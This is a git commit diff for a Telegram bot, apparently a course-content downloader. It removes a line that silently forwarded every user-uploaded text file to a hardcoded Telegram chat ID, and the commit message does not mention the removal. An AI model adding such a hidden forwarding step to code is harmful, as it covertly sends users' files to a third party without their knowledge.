6d83598e7085bc6958501a425752dcefff57baa2
Soninkuwal <158008154+Soninkuwal@users.noreply.github.com>
2024-12-17 17:39:53 +0530

    UPDATE : ADD CP , APPX , UTKARSH && FIXD YT-DLP PROBLUM

--- main.py
+++ main.py
@@ -58,7 +58,6 @@ async def upload(bot: Client, m: Message):
     editable = await m.reply_text('𝕤ᴇɴᴅ ᴛxᴛ ғɪʟᴇ ⚡️')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002284475096, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
